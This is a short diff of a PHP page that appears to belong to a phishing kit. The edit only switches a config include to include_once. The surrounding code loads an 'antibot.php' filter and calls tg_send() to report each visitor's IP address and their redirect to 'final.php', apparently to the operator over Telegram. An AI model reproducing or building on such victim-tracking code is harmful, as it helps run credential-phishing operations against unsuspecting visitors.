@@ -1,6 +1,6 @@
 <?php
 include 'antibot.php';
-include 'config.php';
+include_once("config.php");
 tg_send("✅ <b>Redirected to final.php</b>\nIP: {$_SERVER['REMOTE_ADDR']}");
 ?>
 <!DOCTYPE html>
